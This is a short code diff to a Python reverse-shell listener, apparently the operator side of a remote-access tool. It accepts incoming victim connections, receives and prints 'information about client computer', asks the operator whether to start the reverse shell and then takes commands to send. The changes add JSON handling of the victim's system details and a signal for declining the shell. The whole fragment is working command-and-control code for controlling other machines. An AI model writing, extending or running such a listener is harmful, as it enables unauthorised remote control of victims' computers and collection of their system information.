@@ -2,6 +2,7 @@ import socket
 import sys
 from colorama import Fore
 import logging
+import json
 
 
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -15,13 +16,14 @@ print(Fore.BLUE + f"[*] Listening on {HOST}:{PORT}...")
 
 while True:
     client = soc.accept()
-    # info = client[0].recv(1024).decode()
     print(Fore.GREEN + f"[-] Connected to {client[1]}")
-    # print(Fore.CYAN + info)  # Information about client computer
     client[0].send(f"Connected to {HOST}:{PORT}".encode())
-    
+    info = json.dumps(client[0].recv(1024).decode(), indent=4)
+    print(json.loads(info)) # Information about client computer
+
     sh = input("[-] Start the Reverse Shell (Y/n): ")
     if sh == "n" or sh == "N":
+        client[0].send("NoReverseShell".encode())
         break
     while True:
         cmd = input(Fore.MAGENTA + ">>> " + Fore.WHITE)
